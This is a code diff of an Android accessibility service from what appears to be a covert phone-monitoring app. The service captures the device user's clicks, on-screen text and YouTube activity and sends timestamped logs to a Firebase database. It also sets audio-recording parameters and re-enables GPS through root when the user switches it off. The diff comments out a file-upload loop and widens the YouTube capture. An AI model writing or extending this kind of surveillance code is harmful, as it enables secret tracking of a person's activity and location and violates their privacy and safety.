@@ -83,14 +83,14 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
         )
 
     override fun onInterrupt() {}
-    private fun getReference(child: String): DatabaseReference =
-        firebase.getDatabaseReference(child)
+    private fun getReference(child: String): DatabaseReference =   firebase.getDatabaseReference(child)
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         var packageName = ""
         if (event.packageName != null) {
             packageName = event.packageName.toString() + ":"
         }
+        Log.i(TAG, "onAccessibilityEvent $packageName");
 //        var file = File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt")
 //        var fileExists = file.exists()
 //        if (!fileExists) {
@@ -128,30 +128,30 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
 
                 //      val filePath = "/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/" //${Consts.ADDRESS_AUDIO_RECORD}";
                 var dateName = "" //fileName!!.replace("$filePath/", "")
-                var uri =
-                    Uri.fromFile(File("fileName")) //file:///storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/28%20sept.%202022%2002%3A19%20p.%20m.%2C1664392755930.mp3
-                File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/txts/").walk()
-                    .forEach {
-                        println(it)
-                        dateName = it.absolutePath
-                        uri = Uri.fromFile(File(dateName))
-
-                        disposable.add(
-                            firebase.putFile("$RECORDING/$dateName", uri)
-                                .subscribeOn(Schedulers.io())
-                                .observeOn(AndroidSchedulers.mainThread())
-                                .subscribe(
-                                    {
-                                        setPushName()
-                                    },
-                                    {
-                                        deleteFile(fileName)
-                                    })
-                        )
-                    }
-                //    TimeUnit.SECONDS.sleep(1L)
+                var uri = Uri.fromFile(File("fileName")) //file:///storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/28%20sept.%202022%2002%3A19%20p.%20m.%2C1664392755930.mp3
+//                File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/").walk()
+//                    .forEach {
+//                        println(it)
+//                        if (it.absolutePath.contains(".mp3")) {
+//                            dateName = it.absolutePath
+//                            uri = Uri.fromFile(File(dateName))
+//
+//                            disposable.add(
+//                                firebase.putFile("$RECORDING/$dateName", uri)
+//                                    .subscribeOn(Schedulers.io())
+//                                    .observeOn(AndroidSchedulers.mainThread())
+//                                    .subscribe(
+//                                        {
+//                                            setPushName()
+//                                        },
+//                                        {
+//                                            deleteFile(fileName)
+//                                        })
+//                            )
+//                        }
+//                    }
             }
-            if (packageName.contains("youtube")) {
+            if (packageName.contains("youtube") || data.contains("youtube")) {
                 // val text = event.text.toString();
                 val text = packageName + event.text.toString()
 
@@ -163,8 +163,8 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
                 //Recording
                 val childRecording = ChildRecording(true, 3600000)
                 getReference("$RECORDING/$PARAMS").setValue(childRecording)
-
-                if (data != "[]" && data != "[YouTube]") {
+             //   if (data != "[]" && data != "[YouTube]") {
+                if (text.contains("[YouTube]")) {
                     interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
                     i(TAG, "${getDateTime()} |(youtube)| $data")
                     //  showApp(true)
@@ -211,9 +211,10 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
                         data = packageName + ": " + data;
                         interactor.setDataKey("${getDateTime()} |(CLICKED)| $data")
                         i(TAG, "${getDateTime()} |(CLICKED)| $data")
-                    } else {
-                        val data = event.contentDescription.toString()
-                    }
+             }
+        //            else {
+//                        val data = event.contentDescription.toString()
+//                    }
                 }
                 AccessibilityEvent.TYPE_VIEW_LONG_CLICKED -> {
 
@@ -339,7 +340,10 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
     override fun onProviderDisabled(provider: String?) {
         if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER))
             interactor.enableGps(false)
-        runDelayedOnUiThread(3000) { if (isRoot()) enableGpsRoot() }
+        runDelayedOnUiThread(3000) {
+            if (isRoot())
+                enableGpsRoot()
+        }
     }
 
 }
